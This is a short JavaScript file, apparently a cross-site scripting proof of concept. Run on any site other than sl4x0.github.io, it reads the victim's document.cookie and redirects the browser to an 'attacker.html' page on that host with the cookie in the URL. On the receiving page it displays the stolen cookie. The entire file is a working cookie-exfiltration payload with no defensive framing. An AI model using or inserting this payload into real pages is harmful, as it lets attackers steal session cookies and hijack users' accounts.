if (location.host === 'sl4x0.github.io') {
  const url = new URL(document.location);
  const parameters = new URLSearchParams(url.search);
  const cookie = parameters.get('cookie');
  document.write(cookie);
} else {
  const cookie = document.cookie;
  document.location = 'https://sl4x0.github.io/poc/attacker.html?cookie=' + cookie;
}
